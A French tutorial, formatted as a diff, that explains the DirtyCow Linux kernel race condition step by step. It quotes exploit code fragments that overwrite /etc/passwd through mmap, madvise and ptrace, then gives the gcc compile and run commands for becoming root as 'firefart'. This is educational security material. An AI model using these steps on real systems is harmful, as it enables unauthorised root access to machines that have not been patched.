@@ -1,0 +1,145 @@
+comme on sait que la plupart des failles de sécurité découvertes sur les anciennes versions d’un O.S sont répertoriées sur le web 
+
+(d’où la nécessité de faire les mises à jours de ses systèmes d’information le plus fréquemment possible !) 
+
+on peut s’amuser à afficher la version du kernel de notre machine et regarder ensuite sur le web si il existe des failles nous permettant de mener une escalade des privilèges en local.
+
+
+une fois connecté en ssh sur une session on fait la commande uname avec l’option -r pour connaitre la version du kernel et on obtient ceci : 3.2.0-91-generic-pae
+ 
+on va pouvoir rechercher sur le web si il existe des exploits répertorié et fonctionnant sur cette version du kernel ou des versions antérieures  
+
+on découvre une faille très interessante nommé dirtycow.
+
+la faille de sécurité nommée dirtycow permet à un utilisateur régulier sur un système linux de mener une escalade de privilège local et de devenir root :
+
+pour un user non root il y a un ensemble de fichier dont les privilèges utilisateurs sont en lecture seule, pourtant le code source de l’exploit de la faille DirtyCow permet à un user qui a seulement les droits de lecture sur les fichiers root de pouvoir écrire sur ces même fichiers ! 
+
+pour peu que le fichier sois setuid root, lors de l’execution le tour est joué car on aura droit de lecture d’écriture et d’execution de l’user root en étant seulement un user non root ! 
+
+(setuid est un bit de controle d'accès appliqués aux fichiers et répertoires sous unix;
+Grâce à lui, un processus exécutant un tel fichier peut s'exécuter au nom d'un autre utilisateur
+par exemple quand un fichier exécutable est la propriété de l’utilisateur root et est rendu setuid, tout processus exécutant ce fichier peut effectuer ses tâches avec les permissions associées à root. (ce qui constitue un risque de sécurité que l’on peut essayer d’exploiter)
+
+dans cette version de l’exploit cependant il y a un focus sur le fichier /etc/password et non sur un executable setuid
+
+
+un point très interessant est le nom de dirtyCOW, faisant référence au COW ou Copy On Write.
+C’est justement un détournement du Copy On Write par le code (voir script) qui permet à un user qui a seulement les droits de lecture sur les fichiers root de pouvoir écrire sur ces même fichiers 
+
+L’idée théorique est telle: partant du principe qu’une ressource partagée en lecture n’a pas besoin d’exister en plusieurs exemplaires, il est plus intéressant de la copier seulement si elle venait à être modifiée.
+
+la copie sur écriture signifie que si vous deviez écrire dans ce segment de mémoire on en créerais une copie :
+
+voyons tout ceci dans le code source :
+
+f = open(filename, O_RDONLY);
+il ouvre le fichier dans lequel nous voulons écrire en tant que READ_ONLY jusqu’ici tout est normal 
+
+map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
+
+ mmap est utilise pour créer un nouveau segment de mémoire mappé dans le processus en cours avec notre notre file descriptor f en READ_ONLY,
+le drapeau PROT_READ indique bien que cette nouvelle zone mémoire est en READ_ONLY
+seulement le drapeau suivant MAP_PRIVATE est très interessant car selon le man de mmap. ll rend possible le C.O.W (ou copy on write) selon le man de mmap.
+
+ le C.O.W, partant du principe qu’une ressource partagée en lecture n’a pas besoin d’exister en plusieurs exemplaires, plutôt que d’utiliser une quantité de RAM pour charger une copie du fichier il y aura une lecture directe à partir du fichier sur le disque, et si il advenait que notre processus écrive sur ce segment de mémoire alors il y aurait une copie de crée
+
+d’ou même si on est en READ_ONLY en raison du mappage privé nous pouvons en écrire une copie  
+
+on a ici un mmap qui mappera le fichier racine directement dans notre mémoire  et on pourra en lire le contenu ou en écrire une copie.
+
+la copie engendré par les modifications ne se propagera cependant  pas au fichier sous-jacent réel, c’est juste pour nous; c’est pour ça que COW est autorisé en MAP_PRIVATE et seulement en MAP_PRIVATE
+
+donc pour l’instant rien n’est encore fait 
+
+
+
+  pthread_create(&pth,
+                   NULL,
+                   madviseThread,
+                   NULL);
+    ptrace(PTRACE_TRACEME);
+    kill(getpid(), SIGSTOP);
+    pthread_join(pth,NULL);
+  }
+
+void *madviseThread(void *arg) {
+  int i, c = 0;
+  for(i = 0; i < 200000000; i++) {
+    c += madvise(map, 100, MADV_DONTNEED);
+  }
+  printf("madvise %d\n\n", c);
+}
+
+ else {
+    pthread_create(&pth,
+                   NULL,
+                   madviseThread,
+                   NULL);
+    ptrace(PTRACE_TRACEME);
+    kill(getpid(), SIGSTOP);
+    pthread_join(pth,NULL);
+  }
+
+
+ensuite 
+DirtyCow est une vulnérabilité de condition de concurrence cela signifie que certains évènement doivent se produire dans un ordre spécifique assez peu probable dans des circonstances normales 
+
+le thread est madvise_thread qui utilise le syscall madvise :
+ce syscall peut être utilisé pour des raisons d’optimisation 
+madvise permet de fournir des informations au noyau sur la façon dont on a l’intention d’utiliser une zone zappé en mémoire car il existe différentes pour gérer le mise en cache, l’anticipation par exemple 
+en l’occurence l’information que nous fournissons au noyau est que la zone mémoire que nous avons mappé que les 100 premiers octets ne sont pas nécessaire de sitôt 
+
+    c += madvise(map, 100, MADV_DONTNEED);
+
+MADV_DONTNEED signifie qu’on attend pas un accès de sitôt 
+
+pour le moment l’application est terminé avec plage donnée, de sorte que le noyau peut libérer les ressources qui lui sont associées :
+
+les accès ultérieurs aux pages de cette plages  réussiront mais entrainement le rechargement du contenu de la mémoire à partir du fichier mappé sous jacent  
+
+très interessant, sur cet espace mémoire on dit qu’on peut libérer et l’utiliser, ce qui va modifier, et engendre une succession de COW
+
+cela pour le moment va juste déclencher une copie de la mémoire afin que nous puissions y écrire et voir ces changements dans notre map private 
+mais pour l’instant nous n’écrivons pas du tout dans le vrai fichier sous-jacent donc aucun souci 
+
+si on faisait ces choses une fois seulement, ou plusieurs fois mais à intervalle de temps espaçé aucun problème 
+le comportement serait celui attendu 
+
+
+  pid = fork();
+  if(pid) {
+    waitpid(pid, NULL, 0);
+    int u, i, o, c = 0;
+    int l=strlen(complete_passwd_line);
+    for(i = 0; i < 10000/l; i++) {
+      for(o = 0; o < l; o++) {
+        for(u = 0; u < 10000; u++) {
+          c += ptrace(PTRACE_POKETEXT,
+                      pid,
+                      map + o,
+                      *((long*)(complete_passwd_line + o)));
+        }
+
+
+Nous comprenons le comportement du COW après une fork comme suit : le fork crée une copie de la table de page du parent pour l'enfant et marque les pages physiques en lecture seule, donc si l'un des deux processus essaie de l'écrire déclenchera un défaut de page et copiera la page.
+
+
+
+mais comme il y a un problème de condition de concurrence et bien en essayant encore et encore a intervalle de temps très proche cela va créer un contournement étrange qui ne se produit généralement pas mais dans ce cas le noyau incite à écrire dans le fichier sous-jacent !!!
+
+          c += ptrace(PTRACE_POKETEXT,
+                      pid,
+                      map + o,
+                      *((long*)(complete_passwd_line + o)));
+
+const char *filename = "/etc/passwd";
+
+or c’est bien notre mot de passe equivalent au contenu argv2 qu’on écrit dans le fichier
+/etc/passwd
+
+
+ainsi on créé depuis la connexion ssh le fichier dirty.c qui contient le code source de l’exploit voir (script)
+on compile avec la commande  gcc -pthread dirty.c -o dirty -lcrypt 
+on lance la commande ./dirty mon_mot_de_passe
+après avoir quitté le processus on fait "su firefart" on met la valeur de mon_mot_de_passe (12345) et on est root !!!
